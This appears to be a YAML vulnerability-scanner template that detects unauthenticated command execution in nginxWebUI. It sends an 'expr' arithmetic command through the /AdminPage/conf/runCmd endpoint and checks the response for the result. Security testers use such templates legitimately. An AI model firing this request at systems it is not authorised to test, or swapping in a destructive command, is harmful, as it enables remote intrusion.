name: yaml-poc-nginxwebui-nginxwebui-other-CT-728853
binding: 9477207c-a987-48cd-a6e9-a187447bab97
detail:
    author: jiapeng.han
    links:
        - https://zone.huoxian.cn/d/1210-nginx
    vulnerability:
        id: 82a31a0a-f1b5-4eb4-8fee-d16a7e414d77
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(100000000, 200000000)
    s2: randomInt(10000, 20000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /AdminPage/conf/runCmd?cmd=expr%20{{s1}}%20-%20{{s2}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2))) && response.body_string.contains("运行失败") && response.content_type.contains("application/json")
    r1:
        request:
            cache: true
            method: GET
            path: /AdminPage/conf/runCmd?cmd=expr%20{{s1}}000%20-%20{{s2}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2))) && response.body_string.contains("运行失败") && response.content_type.contains("application/json")
expression: r0() || r1()
